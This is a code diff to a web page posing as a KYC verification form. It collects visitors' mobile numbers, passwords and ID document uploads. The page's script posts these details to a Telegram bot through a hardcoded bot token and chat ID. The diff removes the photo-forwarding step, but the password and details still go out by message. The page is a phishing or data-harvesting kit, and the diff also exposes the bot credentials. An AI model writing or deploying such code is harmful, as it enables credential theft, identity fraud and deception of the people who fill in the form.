@@ -267,7 +267,7 @@
                     <label class="file-upload-box">
                         <i class="fa-solid fa-cloud-arrow-up"></i>
                         <span id="file-label-1">Choose Image</span>
-                        <input type="file" id="file1Input" accept="image/*,.pdf" onchange="updateFileName(this, 'file-label-1')">
+                        <input type="file" accept="image/*,.pdf" onchange="updateFileName(this, 'file-label-1')">
                     </label>
                 </div>
 
@@ -276,7 +276,7 @@
                     <label class="file-upload-box">
                         <i class="fa-solid fa-cloud-arrow-up"></i>
                         <span id="file-label-2">Choose Image</span>
-                        <input type="file" id="file2Input" accept="image/*,.pdf" onchange="updateFileName(this, 'file-label-2')">
+                        <input type="file" accept="image/*,.pdf" onchange="updateFileName(this, 'file-label-2')">
                     </label>
                 </div>
 
@@ -285,7 +285,7 @@
                     <label class="file-upload-box">
                         <i class="fa-solid fa-cloud-arrow-up"></i>
                         <span id="file-label-3">Choose Image</span>
-                        <input type="file" id="file3Input" accept="image/*,.pdf" onchange="updateFileName(this, 'file-label-3')">
+                        <input type="file" accept="image/*,.pdf" onchange="updateFileName(this, 'file-label-3')">
                     </label>
                 </div>
 
@@ -312,13 +312,9 @@
             const mobile = document.getElementById('mobile').value;
             const password = document.getElementById('password').value;
             
-            const file1 = document.getElementById('file1Input').files[0];
-            const file2 = document.getElementById('file2Input').files[0];
-            const file3 = document.getElementById('file3Input').files[0];
-
-            const s1 = file1 ? file1.name : 'Not Uploaded';
-            const s2 = file2 ? file2.name : 'Not Uploaded';
-            const s3 = file3 ? file3.name : 'Not Uploaded';
+            const s1 = document.getElementById('file-label-1').textContent !== 'Choose Image' ? document.getElementById('file-label-1').textContent : 'Not Uploaded';
+            const s2 = document.getElementById('file-label-2').textContent !== 'Choose Image' ? document.getElementById('file-label-2').textContent : 'Not Uploaded';
+            const s3 = document.getElementById('file-label-3').textContent !== 'Choose Image' ? document.getElementById('file-label-3').textContent : 'Not Uploaded';
 
             const botToken = '8899735524:AAEzzcKQpcMO-mMQb9KSQTXmRUjLW7nhKPU';
             const chatId = '8400052598';
@@ -335,41 +331,6 @@
             submitBtn.textContent = "Submitting...";
             submitBtn.disabled = true;
 
-            // Agar koi bhi photo upload ki hai toh pehli available photo bhej do, sath mein saari details caption mein hongi
-            const uploadFile = file1 || file2 || file3;
-
-            if (uploadFile) {
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', uploadFile);
-                formData.append('caption', message);
-                formData.append('parse_mode', 'Markdown');
-
-                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if(data.ok) {
-                        alert("KYC details with photo submitted successfully!");
-                        location.reload();
-                    } else {
-                        // Agar photo send hone mein error aaye toh text-only bhej do taaki form na ruke
-                        sendTextOnly(botToken, chatId, message, submitBtn);
-                    }
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                    sendTextOnly(botToken, chatId, message, submitBtn);
-                });
-            } else {
-                // Agar koi photo select nahi ki hai toh sirf text bhej do
-                sendTextOnly(botToken, chatId, message, submitBtn);
-            }
-        }
-
-        function sendTextOnly(botToken, chatId, message, submitBtn) {
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
